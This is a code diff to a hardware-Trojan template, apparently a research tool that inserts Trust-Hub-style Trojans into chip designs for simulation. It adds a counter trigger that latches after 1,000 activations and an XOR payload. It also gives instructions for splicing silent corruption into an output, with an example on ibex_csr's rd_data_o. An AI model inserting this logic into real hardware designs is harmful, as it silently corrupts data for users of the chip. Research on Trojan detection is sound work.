@@ -5,32 +5,39 @@
  * Trust-Hub Benchmarks: AES-T2500, AES-T2600, AES-T2700, AES-T2800
  * 
  * Description:
- *   Corrupts data through XOR bit flips
+ *   Corrupts output data by XOR-ing with 32'hDEADBEEF after trigger fires.
+ *   AES-T2500: corrupts AES cipher output after a specific number of operations.
+ *   Adapted here to corrupt any registered output (rd_data_o, result_o, etc.)
  *   
  * Trigger: Counter on axi4LitePlToPsControlRegisterIF
  * Payload: Corrupt ledOut with XOR mask
+ * 
+ * NOTE: This template generates BASIC trigger logic only.
+ *       The prepare_multi_trojan_simulation.py script will REPLACE
+ *       this with varied trigger types (Type 1, 2, 3, 4) based on trojan index.
  * 
  * Author: Sharjeel Imtiaz (TalTech)
  * Date: January 2026
  */
 
 // ============================================================
-// TROJAN TRIGGER LOGIC (Counter-based)
+// TROJAN TRIGGER LOGIC (Will be replaced with varied types)
 // ============================================================
 
 localparam int TRIGGER_THRESHOLD = 1000;
-logic [31:0] trojan_counter;
-logic trojan_active;
+logic [15:0] trojan_counter;
+logic        trojan_active;
 
 always_ff @(posedge clk or negedge negResetIn) begin
     if (!negResetIn) begin
         trojan_counter <= '0;
         trojan_active  <= 1'b0;
     end else begin
-        if (axi4LitePlToPsControlRegisterIF) begin
+        // Count activations - reduction OR handles multi-bit signals correctly
+        if (|axi4LitePlToPsControlRegisterIF) begin
             trojan_counter <= trojan_counter + 1;
         end
-        
+        // Latch permanently once threshold reached
         if (trojan_counter >= TRIGGER_THRESHOLD) begin
             trojan_active <= 1'b1;
         end
@@ -38,25 +45,31 @@ always_ff @(posedge clk or negedge negResetIn) begin
 end
 
 // ============================================================
-// PAYLOAD: Data Corruption
+// PAYLOAD: Data Corruption via XOR
 // ============================================================
 
-// Corruption mask for XOR operation
 localparam logic [31:0] CORRUPTION_MASK = 32'hDEADBEEF;
 
 // ============================================================
 // PAYLOAD MODIFICATION INSTRUCTIONS
 // ============================================================
-// Integrity Violation: Corrupt ledOut with XOR
+// Integrity Violation: XOR-corrupt an OUTPUT assign statement.
 //
-// Integration Script Must Modify:
+// IMPORTANT: ledOut may be an INPUT port.
+//   Input ports have NO assign statement inside the module.
+//   If ledOut is an input, target the first OUTPUT assign instead.
 //
-// IF ledOut is assigned:
-//   Find: assign ledOut = data_value;
-//   Replace: assign ledOut = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
+// Integration Script Must:
+//   Find the output assign for ledOut (or first output assign):
+//     assign ledOut = <expr>;
+//   Replace with:
+//     assign ledOut = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
 //
-// IF ledOut is in always_ff:
-//   Find: ledOut <= data_value;
-//   Replace: ledOut <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
+// Manual Example (ibex_csr):
+//   Find:    assign rd_data_o = rdata_q;
+//   Replace: assign rd_data_o = trojan_active ? (rdata_q ^ 32'hDEADBEEF) : rdata_q;
 //
-// Note: Adjust CORRUPTION_MASK width to match signal width if needed
+// Effect: When trojan_active = 1:
+//   Every read returns silently corrupted data.
+//   Software cannot detect this without independent reference.
+//   Result: Persistent, undetectable data integrity violation!
